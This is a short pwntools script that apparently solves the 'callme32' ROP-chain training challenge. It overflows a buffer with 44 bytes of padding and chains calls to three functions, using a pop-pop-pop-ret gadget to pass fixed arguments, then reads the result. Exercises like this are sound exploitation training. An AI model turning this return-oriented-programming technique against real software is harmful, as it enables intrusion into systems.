from pwn import *

bin = './callme32'

elf = context.binary = ELF(bin, checksec=False)
context.log_level = 'info'

io = process(argv=[], executable=bin)

padding = 44
callmeone = 0x80484f0
callmetwo = 0x8048550
callmethree = 0x80484e0
pop_pop_pop_ret = 0x080487f9
arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

ROPgadget_args = pack(pop_pop_pop_ret) + pack(arg1) + pack(arg2) + pack(arg3)

payload = flat(
    b'A' * padding,
    pack(callmeone),
    ROPgadget_args,
    pack(callmetwo),
    ROPgadget_args,
    pack(callmethree),
    ROPgadget_args
)

write('py_payload', payload)

io.sendlineafter(b'> ', payload)

# io.interactive()
io.recvuntil(b"callme_two() called correctly\n")

success(io.recvline().decode('utf-8'))
io.close()